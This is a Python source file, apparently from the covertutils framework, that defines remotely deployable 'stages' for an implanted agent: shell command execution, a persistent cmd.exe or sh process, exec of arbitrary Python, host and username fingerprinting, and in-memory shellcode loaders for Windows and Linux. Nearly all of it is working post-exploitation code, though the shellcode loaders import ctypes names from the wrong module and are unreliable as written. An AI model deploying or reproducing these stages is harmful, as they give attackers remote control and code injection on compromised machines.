"""
This module provides the :data:`CommonStages` dict which contains functions properly implemented for use alogn with :class:`covertutils.handlers.FunctionDictHandler` and subclasses.

The :data:`payloads.CommonStages` contents are arranged by feature as follows::

    CommonStages['shell']       	# Contains another dict with keys every usable instance of the `shell` feature.
    CommonStages['shell']['function']       # Contains the actual pointer to the `shell` function. This function executes its argument directly to the Operating System's shell and returns the Standard Output.
    CommonStages['shell']['marshal']        # Contains a serialized representation of `shell` function using the `python marshal` build-in module.

`marshal` stages are suitable for use with :class:`covertutils.handlers.StageableHandler`. They can be remotely deployed to an existing agent and called via a specified `stream`.

.. code:: python

    >>> from covertutils.payloads import CommonStages
    >>>
    >>> CommonStages['shell']['function']("echo 1")
    '1\\n'
    >>> CommonStages['shell']['marshal']
    'c\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00C\\x00\\x00\\x00s&\\x00\\x00\\x00d\\x01\\x00d\\x02\\x00l\\x00\\x00m\\x01\\x00}\\x01\\x00\\x01|\\x01\\x00|\\x00\\x00\\x83\\x01\\x00j\\x02\\x00\\x83\\x00\\x00}\\x02\\x00|\\x02\\x00S(\\x03\\x00\\x00\\x00Ni\\xff\\xff\\xff\\xff(\\x01\\x00\\x00\\x00t\\x05\\x00\\x00\\x00popen(\\x03\\x00\\x00\\x00t\\x02\\x00\\x00\\x00osR\\x00\\x00\\x00\\x00t\\x04\\x00\\x00\\x00read(\\x03\\x00\\x00\\x00t\\x07\\x00\\x00\\x00messageR\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00result(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00s\\x15\\x00\\x00\\x00covertutils/Stages.pyt\\x0e\\x00\\x00\\x00__system_shell\\x04\\x00\\x00\\x00s\\x06\\x00\\x00\\x00\\x00\\x01\\x10\\x01\\x12\\x01'

"""


import pickle
import marshal
# from types import *

def __work_shell( storage, message ) :
    from os import popen
    result = popen( message ).read()
    return result

def __work_echo( storage, message ) :
	print "Staged function Loaded and run!"
	return message

def __work_python( storage, message ) :
	import sys
	import StringIO
	# ret = None
	try :
		compiled_message = compile(message, '<string>', 'exec')
		# print compiled_message
		retIO = StringIO.StringIO()
		sys.stdout = retIO
		exec (compiled_message, globals(), locals())
		sys.stdout = sys.__stdout__
		ret = retIO.getvalue()
	except Exception as e:
		ret = str(e)
	# print e
	return ret


def __init_shell_process( storage ) :
	from subprocess import Popen, PIPE
	import os
	# print "Payload init()"
	os_specs = {
			'nt' : {'shell':'cmd.exe', 'comm_sep' : '&'},
			'posix' : {'shell':'sh', 'comm_sep' : ';'}
		}
	storage['os_specs'] = os_specs
	# print shell
	storage['process'] = Popen( [os_specs[os.name]['shell']], stdout=PIPE, stderr=PIPE, stdin=PIPE, shell = True, bufsize = -1 )
	return True

def __work_shell_process( storage, message ) :
	p = storage['process']
	from select import select
	from time import sleep
	# print "Payload work()"
	import os

	mark = os.urandom(4).encode('hex')
	command = "{command} {comm_sep} echo {token} {linesep}".format(command=message,
		comm_sep = storage['os_specs'][os.name]['comm_sep'],
		linesep=os.linesep,
		token= mark)
	# print command, command.encode('hex')
	p.stdin.write(command)
	p.stdin.flush()
	stdout_ret = ''
	while True :
		stdout_data = p.stdout.readline()
		# print "STDOUT: '%s'"% stdout_data
		if mark in stdout_data or not stdout_data:
			# print stdout_data.startswith(mark)
			break
		stdout_ret += stdout_data
	return stdout_ret






def __system_info( message ) :
	import platform,json, getpass
	# info = {                     #  131 bytes
	#     'm' : platform.machine(),
	#     'v' : platform.version(),
	#     'p' : platform.platform(),
	#     's' : platform.system(),
	#     'c' : platform.processor(),
	#     'u' : getpass.getuser()
	# }
	# ret = json.dumps(info).replace( " ","" )	    # to save some bytes
	ret = ":".join([                   # 113 bytes
	    platform.machine(),
	    platform.version(),
	    platform.platform(),
	    platform.system(),
	    platform.processor(),
	    getpass.getuser()
	])
	return ret








def __win_shellcode( payload ) :

	from types import windll, c_char_p
	shellcode = payload
	sc = c_char_p(shellcode)
	# Reserves or commits a region of pages in the virtual address space of the calling process.
	pointer = windll.kernel32.VirtualAlloc(c_int(0),
									   c_int(len(sc)),
									   c_int(0x3000),
									   c_int(0x40))
	buffer = (c_char * len(sc)).from_buffer(sc)

	# The RtlMoveMemory routine copies the contents of a source memory block to a destination
	# memory block, and supports overlapping source and destination memory blocks.
	windll.kernel32.RtlMoveMemory(c_int(pointer),
								  buffer,
								  c_int(len(sc)))
	# Creates a thread to execute within the virtual address space of the calling process.
	ht = windll.kernel32.CreateThread(c_int(0),
									  c_int(0),
									  c_int(pointer),
									  c_int(0),
									  c_int(0),
									  pointer(c_int(0)))
	# Waits until the specified object is in the signaled state or the time-out interval elapses.
	windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))



def __lin_shellcode( payload ) :

	from types import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
	from multiprocessing import Process
	libc = CDLL('libc.so.6')
	shellcode = payload

	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))

	p = Process(target=run)				# run the shellcode as independent process
	p.start()





def __system_info_handler( message ) :
    pass

CommonStages = {}
CommonStages['echo'] = {}
CommonStages['echo']['payload'] = {}

CommonStages['echo']['payload']['init'] = None
CommonStages['echo']['payload']['work'] = __work_echo.func_code
CommonStages['echo']['marshal'] = marshal.dumps( CommonStages['echo']['payload'] )

CommonStages['python'] = {}
CommonStages['python']['payload'] = {}

CommonStages['python']['payload']['init'] = None
CommonStages['python']['payload']['work'] = __work_python.func_code
CommonStages['python']['marshal'] = marshal.dumps( CommonStages['python']['payload'] )


CommonStages['shell'] = {}
CommonStages['shell']['payload'] = {}

CommonStages['shell_proc'] = {}
CommonStages['shell_proc']['payload'] = {}

CommonStages['shell_proc']['payload']['init'] = __init_shell_process.func_code
CommonStages['shell_proc']['payload']['work'] = __work_shell_process.func_code
CommonStages['shell_proc']['marshal'] = marshal.dumps( CommonStages['shell_proc']['payload'] )

CommonStages['shell']['payload']['init'] = None
CommonStages['shell']['payload']['work'] = __work_shell.func_code
CommonStages['shell']['marshal'] = marshal.dumps( CommonStages['shell']['payload'] )

# print len(CommonStages['shell_proc']['marshal'])
__work_shell
# CommonStages['shell']['function'] = __system_shell
# CommonStages['shell']['marshal'] = marshal.dumps( __system_shell.func_code )
CommonStages['sysinfo'] = {}
CommonStages['sysinfo']['function'] = __system_info
CommonStages['sysinfo']['marshal'] = marshal.dumps( __system_info.func_code )



WindowsStages = {}
WindowsStages['shellcode'] = {}
WindowsStages['shellcode']['function'] = __win_shellcode
# WindowsStages['shellcode']['marshal'] = marshal.dumps( __win_shellcode )
# WindowsStages['shellcode']['pycode'] = __win_shellcode_pycode

LinuxStages = {}
LinuxStages['shellcode'] = {}
LinuxStages['shellcode']['function'] = __lin_shellcode
# LinuxStages['shellcode']['marshal'] = marshal.dumps( __lin_shellcode )
